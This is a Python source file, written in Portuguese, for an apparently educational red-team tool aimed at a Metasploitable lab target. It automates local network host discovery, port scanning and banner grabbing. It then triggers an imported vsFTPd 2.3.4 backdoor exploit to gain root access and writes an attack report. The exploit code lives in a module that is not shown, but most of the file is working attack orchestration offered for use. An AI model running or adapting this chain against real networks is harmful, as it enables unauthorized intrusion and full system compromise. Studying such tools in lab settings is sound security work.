import sys
import os
import time
import json
from datetime import datetime
from typing import Optional, List, Tuple

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from net_scanner import get_my_ip, scan_with_nbtscan, scan_with_arp_scan
from port_scanner import scan_portas_multithread, SERVICOS_CONHECIDOS
from banner_grabbing import grab_banner, identificar_vulnerabilidade
from backdoor_exploit import exploit_ftp_backdoor, verificar_banner_ftp

REPORT_DIR = "reports"
TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")
REPORT_FILE = f"{REPORT_DIR}/relatorio_ataque_{TIMESTAMP}.md"
LOG_FILE = f"{REPORT_DIR}/log_ataque_{TIMESTAMP}.txt"

PORTAS_RAPIDAS = [21, 22, 80, 139, 443, 445, 1524, 3306, 5900, 8080]

def criar_diretorio_report():
    if not os.path.exists(REPORT_DIR):
        os.makedirs(REPORT_DIR)
        print(f"[+] Pasta criada: {REPORT_DIR}")

def log_ataque(mensagem: str, tipo: str = "INFO"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    linha = f"[{timestamp}] [{tipo}] {mensagem}"
    print(linha)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(linha + "\n")


def mostrar_menu():
    print("\n" + "="*60)
    print(" O QUE QUERES FAZER?")
    print("="*60)
    print("1. Ataque COMPLETO")
    print("2. So procurar hosts na rede")
    print("3. So fazer scan de portas")
    print("4. So apanhar banners dos servicos")
    print("5. So explorar a falha do vsFTPd")
    print("6. Escolher eu o IP e o que fazer")
    print("0. Sair")
    print("="*60)
    return input("\n[*] Escolhe uma opcao: ").strip()

def fase_descobrir_hosts() -> Optional[str]:
    print("\n" + "="*60)
    print(" PASSO 1: VOU PROCURAR HOSTS NA REDE")
    print("="*60)
    
    meu_ip = get_my_ip()
    if not meu_ip:
        print("[-] Nao consegui descobrir o IP da maquina")
        return None
    
    partes_ip = meu_ip.split('.')
    rede = f"{partes_ip[0]}.{partes_ip[1]}.{partes_ip[2]}.0/24"
    
    print(f"[*] O meu IP e: {meu_ip}")
    print(f"[*] Vou vasculhar a rede: {rede}")
    
    resultados = scan_with_nbtscan(rede)
    
    if not resultados or resultados.strip() == "":
        print("[*] O nbtscan nao deu nada, vou tentar com arp-scan")
        resultados = scan_with_arp_scan(rede)
    
    if resultados and resultados.strip():
        print("\n[+] Encontrei estes hosts na rede:")
        print("-" * 50)
        
        import re
        ips_encontrados = re.findall(r'\d+\.\d+\.\d+\.\d+', resultados)
        
        hosts = [ip for ip in ips_encontrados if ip != meu_ip]
        hosts = list(dict.fromkeys(hosts))
        
        for i, host in enumerate(hosts, 1):
            print(f"    {i}. {host}")
        
        if hosts:
            print(f"\n[+] No total encontrei {len(hosts)} hosts")
            
            if len(hosts) > 1:
                escolha = input(f"\n[*] Qual queres atacar? (1-{len(hosts)}) ou ENTER para o primeiro: ")
                if escolha.isdigit() and 1 <= int(escolha) <= len(hosts):
                    alvo = hosts[int(escolha)-1]
                else:
                    alvo = hosts[0]
            else:
                alvo = hosts[0]
            
            print(f"[+] Esta e a vitima: {alvo}")
            return alvo
    
    print("[-] Nao encontrei nenhum host na rede, confirma a ligacao")
    return None

def fase_scan_portas(ip_alvo: str, modo_rapido: bool = True) -> List[Tuple[int, str, float]]:
    print("\n" + "="*60)
    print(" PASSO 2: VOU FAZER SCAN DAS PORTAS")
    print("="*60)
    
    if modo_rapido:
        print(f"[*] Modo rapido: vou testar {len(PORTAS_RAPIDAS)} portas")
    else:
        print(f"[*] Modo completo: vou testar todas as portas (pode demorar um bocado)")
    
    from port_scanner import portas_a_testar as PORTAS_COMPLETAS
    
    print(f"[*] Alvo: {ip_alvo}")
    print(f"[*] A comecar o scan")
    
    portas_abertas = scan_portas_multithread(ip_alvo, PORTAS_RAPIDAS if modo_rapido else PORTAS_COMPLETAS, max_threads=40, timeout=0.5)
    
    if portas_abertas:
        print(f"\n[+] Encontrei {len(portas_abertas)} portas abertas:")
        for porta, servico, tempo in portas_abertas:
            print(f"    - Porta {porta}: {servico}")
    else:
        print("[-] Nao encontrei nenhuma porta aberta")
    
    return portas_abertas

def fase_banner_grabbing(ip_alvo: str, portas: List[int]):
    print("\n" + "="*60)
    print(" PASSO 3: VOU TENTAR APANHAR BANNERS DOS SERVICOS")
    print("="*60)
    
    print(f"[*] Vou analisar {len(portas)} portas no {ip_alvo}")
    print("[*] A ver o que cada servico diz...")
    
    from banner_grabbing import grab_banner as grab_banner_func
    
    for porta in portas:
        grab_banner_func(ip_alvo, porta)
    
    print("\n[+] Ja apanhei os banners todos")

def fase_exploracao(ip_alvo: str) -> bool:
    print("\n" + "="*60)
    print(" PASSO 4: VOU TENTAR EXPLORAR A FALHA DO vsFTPd")
    print("="*60)
    
    print(f"[*] Vou verificar o FTP no {ip_alvo}:21...")
    
    if verificar_banner_ftp(ip_alvo):
        print("[+] O alvo e vulneravel! A ver se conseguimos entrar...")
        
        confirm = input("\n[!] Queres mesmo continuar com o ataque? (s/N): ")
        if confirm.lower() == 's':
            print("[*] A ativar o backdoor...")
            success = exploit_ftp_backdoor(ip_alvo)
            if success:
                print("[+] Conseguimos! Ganhaste acesso root ao sistema!")
                return True
            else:
                print("[-] Nao consegui entrar. Algo correu mal")
        else:
            print("[*] Pronto, nao fiz nada. Ficas para a proxima")
    else:
        print("[-] Nao e vulneravel a esta falha...")
        print("[*] Talvez de para atacar por outro lado (SMB, SSH, etc.)")
    
    return False

def gerar_relatorio(ip_alvo: str, portas_abertas: List, exploit_success: bool):
    print("\n" + "="*60)
    print(" A GERAR RELATORIO DO ATAQUE")
    print("="*60)
    
    with open(REPORT_FILE, "w", encoding="utf-8") as f:
        f.write(f"# Relatorio do Ataque - Red Team\n\n")
        f.write(f"**Quando foi:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"**Quem atacou:** Kali Linux\n")
        f.write(f"**A Vitima:** {ip_alvo} (Metasploitable)\n\n")
        
        f.write("## O Que Aconteceu\n\n")
        f.write("| Passo | Como Correu | Detalhes |\n")
        f.write("|------|-------------|----------|\n")
        f.write("| Encontrar hosts | Correu bem | Fiz scan da rede local |\n")
        f.write(f"| Scan de portas | Correu bem | Encontrei {len(portas_abertas)} portas abertas |\n")
        f.write("| Apanhar banners | Correu bem | Descobri quais servicos estao la |\n")
        f.write(f"| Explorar falha | {'Sucesso' if exploit_success else 'Falhou'} | Tentei o vsFTPd 2.3.4 |\n\n")
        
        f.write("## Portas Abertas\n\n")
        f.write("| Porta | Servico | Observacoes |\n")
        f.write("|-------|---------|-------------|\n")
        for porta, servico, _ in portas_abertas:
            vulneravel = "Cuidado com esta! Vulneravel a vsFTPd" if porta == 21 else "-"
            f.write(f"| {porta} | {servico} | {vulneravel} |\n")
        
        f.write("\n## Comandos que Usei\n\n")
        f.write("```bash\n")
        f.write(f"# Para descobrir hosts na rede\n")
        f.write(f"python3 net_scanner.py\n\n")
        f.write(f"# Para escanear as portas\n")
        f.write(f"python3 port_scanner.py -> IP: {ip_alvo}\n\n")
        f.write(f"# Para apanhar os banners\n")
        f.write(f"python3 banner_grabbing.py -> IP: {ip_alvo}\n\n")
        f.write(f"# Para explorar a falha\n")
        f.write(f"python3 backdoor_exploit.py {ip_alvo}\n")
        f.write("```\n")
        
        f.write("\n## Provas do Ataque\n\n")
        f.write(f"- Log do ataque: `{LOG_FILE}`\n")
        
    print(f"[+] Relatorio guardado em: {REPORT_FILE}")
    print(f"[+] Log do ataque guardado em: {LOG_FILE}")

def ataque_completo_auto():
    log_ataque("A COMECAR O ATAQUE COMPLETO", "SUCCESS")
    
    ip_alvo = fase_descobrir_hosts()
    if not ip_alvo:
        log_ataque("Nao consegui encontrar um alvo...", "ERROR")
        return
    
    portas_abertas = fase_scan_portas(ip_alvo, modo_rapido=True)
    if not portas_abertas:
        log_ataque("Nao ha portas abertas...", "WARNING")
        return
    
    portas_lista = [p for p, _, _ in portas_abertas]
    fase_banner_grabbing(ip_alvo, portas_lista)
    
    exploit_success = False
    if 21 in portas_lista:
        exploit_success = fase_exploracao(ip_alvo)
    else:
        print("\n[-] A porta 21 (FTP) esta fechada...")
        print("[*] Nao ha mais nada a fazer")
    
    gerar_relatorio(ip_alvo, portas_abertas, exploit_success)
    
    log_ataque("MISSAO CUMPRIDA! ATAQUE TERMINADO", "SUCCESS")

def ataque_personalizado():
    ip_alvo = input("\n[*] Qual e o IP do alvo? ").strip()
    
    if not ip_alvo:
        print("[-] Isso nao e um IP valido...")
        return
    
    print(f"\n[*] Ok, o alvo e {ip_alvo}")
    
    print("\nO que queres fazer?")
    print("1. So fazer o scan de portas")
    print("2. Scan de portas e apanhar banners")
    print("3. Fazer tudo: scan, banners e explorar (recomendo)")
    opcao = input("Escolhe (1-3): ").strip()
    
    portas_abertas = fase_scan_portas(ip_alvo, modo_rapido=False)
    if not portas_abertas:
        return
    
    portas_lista = [p for p, _, _ in portas_abertas]
    
    if opcao in ["2", "3"]:
        fase_banner_grabbing(ip_alvo, portas_lista)
    
    exploit_success = False
    if opcao == "3":
        if 21 in portas_lista:
            exploit_success = fase_exploracao(ip_alvo)
        else:
            print("[-] A porta 21 nao esta aberta... nao consigo fazer o exploit")
    
    gerar_relatorio(ip_alvo, portas_abertas, exploit_success)

def main():
    criar_diretorio_report()
    
    log_ataque("Ferramenta de ataque iniciada", "INFO")
    log_ataque(f"Vou guardar os relatorios na pasta: {REPORT_DIR}")
    
    while True:
        opcao = mostrar_menu()
        
        if opcao == "1":
            ataque_completo_auto()
        elif opcao == "2":
            ip = fase_descobrir_hosts()
            if ip:
                print(f"\n[+] Encontrei este host: {ip}")
        elif opcao == "3":
            ip = input("Qual e o IP do alvo? ").strip()
            if ip:
                fase_scan_portas(ip, modo_rapido=False)
        elif opcao == "4":
            ip = input("Qual e o IP do alvo? ").strip()
            if ip:
                portas_input = input("Quais portas? (separadas por virgula, ex: 21,22,80): ").strip()
                if portas_input:
                    portas = [int(p.strip()) for p in portas_input.split(",")]
                    fase_banner_grabbing(ip, portas)
        elif opcao == "5":
            ip = input("Qual e o IP do alvo? ").strip()
            if ip:
                fase_exploracao(ip)
        elif opcao == "6":
            ataque_personalizado()
        elif opcao == "0":
            print("\n[*] A fechar... ate a proxima")
            log_ataque("Ferramenta fechada pelo utilizador", "INFO")
            break
        else:
            print("[-] Opcao invalida... escolhe outra")
        
        input("\n\n[*] Pressiona ENTER para continuar...")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Pressionaste Ctrl+C... a fechar")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Aconteceu um erro inesperado: {e}")
        sys.exit(1)
